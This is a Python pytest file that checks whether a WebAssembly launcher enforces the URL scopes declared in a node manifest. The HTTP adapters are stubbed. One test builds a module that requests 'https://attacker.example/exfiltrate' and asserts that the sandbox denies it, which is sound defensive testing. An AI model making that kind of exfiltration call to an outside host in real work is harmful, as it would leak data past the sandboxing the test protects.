"""Phase 3d: end-to-end tests for manifest-declared scopes.

Phase 3c proved that the launcher honours per-call URL and path
scoping when a test subclass injects scopes. Phase 3d threads those
scopes through from the node manifest itself. The launcher accepts an
optional `manifest_path` keyword argument; when supplied, it parses
`url_pattern` and `path_scope` fields from the manifest's
`requested_capabilities` entries and passes them to `_mint_handles`.

These tests cover three cases:
  1. A manifest declares `network.read` with a narrow `url_pattern`.
     An in-scope URL succeeds and an out-of-scope URL is denied.
  2. A manifest declares `network.read` with no scope fields. The
     launcher falls back to wildcard, matching the legacy default.
  3. No manifest_path is passed. The launcher mints wildcards as
     before; this matches the pre-Phase-3d call shape used across the
     existing test suite.
"""

from __future__ import annotations

import textwrap
from pathlib import Path

import pytest

from skg import host_adapters
from skg.wasmtime_launcher import WasmtimeRuntime


@pytest.fixture(autouse=True)
def _stub_real_adapters(monkeypatch):
    """Replace real HTTP adapters with stubs for these tests.

    The launcher's host wrappers call into real HTTP adapters once a
    URL passes scope validation. These tests assert the scope check
    fires correctly, not the network call. Stub adapters short-circuit
    the network leg with a small JSON body.
    """
    def _stub(_payload):
        return host_adapters.ERRNO_SUCCESS, b'{"stub":true}'

    fake = {key: _stub for key in host_adapters.ADAPTERS}
    monkeypatch.setattr(host_adapters, "ADAPTERS", fake)


def _http_get_wat(payload: str) -> str:
    """WAT that calls skg.http_get once with the given JSON payload."""
    payload_bytes = payload.encode("utf-8")
    payload_len   = len(payload_bytes)
    escaped       = payload.replace('\\', '\\\\').replace('"', '\\"')
    return textwrap.dedent(f'''
        (module
          (import "skg" "http_get"
            (func $http_get (param i32 i32 i32 i32 i32 i32) (result i32)))
          (import "wasi_snapshot_preview1" "proc_exit"
            (func $proc_exit (param i32)))
          (memory (export "memory") 1)
          (data (i32.const 0) "{escaped}")
          (func (export "_start")
            (call $proc_exit
              (call $http_get
                (i32.const 1)
                (i32.const 0)
                (i32.const {payload_len})
                (i32.const 1024)
                (i32.const 1024)
                (i32.const 2048)))))
    ''').strip()


def _write(tmp_path: Path, name: str, body: str, suffix: str = "wat") -> Path:
    out = tmp_path / f"{name}.{suffix}"
    out.write_text(body)
    return out


def _scoped_manifest(tmp_path: Path, url_pattern: str | None) -> Path:
    """Write a YAML manifest with one network.read capability entry."""
    if url_pattern is None:
        body = textwrap.dedent('''
            task_type: phase3d_test
            header: "Phase 3d scope test (no scope fields)."
            requested_capabilities:
              - effect: network.read
                adapter: local
        ''').strip()
    else:
        body = textwrap.dedent(f'''
            task_type: phase3d_test
            header: "Phase 3d scope test."
            requested_capabilities:
              - effect: network.read
                adapter: local
                url_pattern: "{url_pattern}"
                path_scope: "/"
        ''').strip()
    return _write(tmp_path, "manifest", body, suffix="yaml")


def test_manifest_scope_in_scope_url_succeeds(tmp_path: Path) -> None:
    """Manifest declares a narrow url_pattern; an in-scope URL succeeds."""
    manifest = _scoped_manifest(tmp_path, "https://api.allowed.example/*")
    wat      = _http_get_wat('{"url":"https://api.allowed.example/foo"}')
    wasm     = _write(tmp_path, "in_scope", wat)

    runtime = WasmtimeRuntime()
    result  = runtime.execute(
        wasm_path=wasm,
        node_id="phase3d",
        task="fetch",
        context={},
        granted_effects=["network.read"],
        manifest_path=manifest,
    )
    assert result.success is True, f"expected success, got: {result.error}"


def test_manifest_scope_out_of_scope_url_denied(tmp_path: Path) -> None:
    """Manifest declares a narrow url_pattern; an out-of-scope URL is denied."""
    manifest = _scoped_manifest(tmp_path, "https://api.allowed.example/*")
    wat      = _http_get_wat('{"url":"https://attacker.example/exfiltrate"}')
    wasm     = _write(tmp_path, "out_of_scope", wat)

    runtime = WasmtimeRuntime()
    result  = runtime.execute(
        wasm_path=wasm,
        node_id="phase3d",
        task="exfiltrate",
        context={},
        granted_effects=["network.read"],
        manifest_path=manifest,
    )
    assert result.success is False
    assert "13" in result.error


def test_manifest_without_scope_fields_falls_back_to_wildcard(tmp_path: Path) -> None:
    """Legacy manifest with no scope fields keeps wildcard URL behaviour."""
    manifest = _scoped_manifest(tmp_path, url_pattern=None)
    wat      = _http_get_wat('{"url":"https://anywhere.example/path"}')
    wasm     = _write(tmp_path, "legacy", wat)

    runtime = WasmtimeRuntime()
    result  = runtime.execute(
        wasm_path=wasm,
        node_id="phase3d",
        task="fetch",
        context={},
        granted_effects=["network.read"],
        manifest_path=manifest,
    )
    assert result.success is True, f"expected success, got: {result.error}"


def test_no_manifest_path_keeps_wildcard_default(tmp_path: Path) -> None:
    """When manifest_path is None the launcher mints wildcards as before."""
    wat  = _http_get_wat('{"url":"https://anywhere.example/path"}')
    wasm = _write(tmp_path, "no_manifest", wat)

    runtime = WasmtimeRuntime()
    result  = runtime.execute(
        wasm_path=wasm,
        node_id="phase3d",
        task="fetch",
        context={},
        granted_effects=["network.read"],
    )
    assert result.success is True, f"expected success, got: {result.error}"
